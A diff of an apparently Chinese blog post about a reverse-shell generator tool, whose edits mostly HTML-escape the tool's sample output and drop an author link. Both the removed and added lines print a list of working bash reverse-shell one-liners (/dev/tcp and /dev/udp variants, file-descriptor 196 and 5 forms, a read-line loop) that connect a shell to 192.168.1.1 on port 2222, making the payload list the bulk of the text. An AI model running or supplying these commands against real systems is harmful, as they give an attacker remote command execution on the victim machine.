@@ -50,7 +50,7 @@ $ ./revshell 192.168.1.1 2222 bash
  _____               _____ _          _ _    _____  
 |  __ \             / ____| |        | | |  / ____|
 | |__) |_____   __ | (___ | |__   ___| | | | |  __  ___ _ __ 
-|  _  // _ \ \ / /  \___ \| '_ \ / _ \ | | | | |_ |/ _ \ '_ \
+|  _  // _ \ \ / /  \___ \| &#39;_ \ / _ \ | | | | |_ |/ _ \ &#39;_ \
 | | \ \  __/\ V /   ____) | | | |  __/ | | | |__| |  __/ | | |
 |_|  \_\___| \_/   |_____/|_| |_|\___|_|_|  \_____|\___|_| |_|
 
@@ -58,23 +58,23 @@ $ ./revshell 192.168.1.1 2222 bash
 
 ------------------------------------------
 Bash -i:
-bash -i >& /dev/tcp/192.168.1.1/2222 0>&1
-/bin/bash -i >& /dev/tcp/192.168.1.1/2222 0>&1
+bash -i &gt;&amp; /dev/tcp/192.168.1.1/2222 0&gt;&amp;1
+/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.1/2222 0&gt;&amp;1
 ------------------------------------------
 Bash 196:
-0<&196;exec 196<>/dev/tcp/192.168.1.1/2222; bash <&196 >&196 2>&196
-0<&196;exec 196<>/dev/tcp/192.168.1.1/2222; /bin/bash <&196 >&196 2>&196
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.1.1/2222; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.1.1/2222; /bin/bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
 ------------------------------------------
 Bash read line:
-exec 5<>/dev/tcp/192.168.1.1/2222;cat <&5 | while read line; do $line 2>&5 >&5; done
+exec 5&lt;&gt;/dev/tcp/192.168.1.1/2222;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
 ------------------------------------------
 Bash 5:
-bash -i 5<> /dev/tcp/192.168.1.1/2222 0<&5 1>&5 2>&5
-/bin/bash -i 5<> /dev/tcp/192.168.1.1/2222 0<&5 1>&5 2>&5
+bash -i 5&lt;&gt; /dev/tcp/192.168.1.1/2222 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5
+/bin/bash -i 5&lt;&gt; /dev/tcp/192.168.1.1/2222 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5
 ------------------------------------------
 Bash UDP:
-bash -i >& /dev/udp/192.168.1.1/2222 0>&1
-/bin/bash -i >& /dev/udp/192.168.1.1/2222 0>&1
+bash -i &gt;&amp; /dev/udp/192.168.1.1/2222 0&gt;&amp;1
+/bin/bash -i &gt;&amp; /dev/udp/192.168.1.1/2222 0&gt;&amp;1
 ```
 
 ![image](/resource/RevShell.assets/259199615-c5c4ea25-9191-4b5c-ab20-b3a86a604de3.png)
@@ -99,6 +99,6 @@ bash -i >& /dev/udp/192.168.1.1/2222 0>&1
 
 ---
 
-> 作者: [Gh0stX](https://blog.csdn.net/weixin_42575797?type=blog)  
+> 作者: Gh0stX  
 > URL: https://www.bthoughts.top/posts/revshell/  
 
